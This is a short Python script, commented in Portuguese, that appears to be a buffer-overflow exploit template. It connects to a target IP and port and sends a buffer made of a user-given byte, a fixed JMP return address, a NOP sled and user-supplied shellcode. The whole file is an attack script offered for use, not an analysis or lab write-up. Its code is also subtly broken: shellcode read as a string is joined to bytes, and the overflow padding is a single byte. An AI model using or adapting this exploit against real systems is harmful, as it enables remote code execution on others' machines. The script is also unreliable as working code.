import sys
import socket

def main():
    # Verifica se foram fornecidos o IP e a porta como argumentos
    if len(sys.argv) < 3:
        print("Uso: python arquivo.py <IP> <PORTA>")
        return

    # Obtém o IP e a porta dos argumentos de linha de comando
    ip = sys.argv[1]
    porta = int(sys.argv[2])

    # Cria um objeto socket
    soquete = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Conecta ao servidor
        soquete.connect((ip, porta))
        print("Conexão estabelecida com sucesso!")

        # Cria o buffer
        shellcode = input("Digite o shellcode: ")
        jmp = b"\xf3\x12\x17\x31"  # Valor fixo em little endian do JMP
        nop = b"\x90" * 10         # 10 bytes do NOP

        # Calcula o tamanho total do buffer
        tamanho_buffer = len(shellcode) + len(jmp) + len(nop)

        # Obtém o valor em bytes fornecido pelo usuário
        valor_bytes = int(input("Digite o valor em bytes: "))

        # Concatena o buffer
        buffer = bytes([valor_bytes]) + jmp + nop + shellcode

        # Envie o buffer para o servidor
        soquete.send(buffer)

    except ConnectionRefusedError:
        print("A conexão foi recusada. Certifique-se de que o servidor está em execução.")

    finally:
        # Fecha o soquete
        soquete.close()
        print("Conexão encerrada.")

if __name__ == "__main__":
    # Modifique o valor do JMP aqui, se necessário
    jmp = b"\xf3\x12\x17\x31"

    main()
